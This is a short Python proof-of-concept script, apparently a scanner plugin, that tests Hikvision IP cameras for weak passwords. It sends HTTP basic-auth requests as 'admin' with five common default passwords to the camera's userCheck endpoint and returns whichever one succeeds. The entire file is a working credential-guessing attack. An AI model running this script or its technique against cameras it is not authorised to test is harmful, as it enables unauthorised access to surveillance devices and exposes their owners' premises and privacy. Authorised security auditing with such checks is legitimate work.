import requests
from plugin.target_parse import get_standard_url
import re
# 海康威视摄像头弱口令

def poc(url):
    target = f"{get_standard_url(url)}/PSIA/Custom/HIK/userCheck"
    try:
        session = requests.Session()
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
                   "Referer": url,
                   "X-Requested-With": "XMLHttpRequest"
                   }
        for p in ("admin", "12345", "123456", "888888", "666666"):
            r = session.get(target, headers=headers, auth=("admin", p), timeout=10)
            if re.findall(r'<statusValue>(.+?)</statusValue>', r.text)[0] == '200':
                return f"{url}: --> admin/{p}"
    except:
        pass
    return None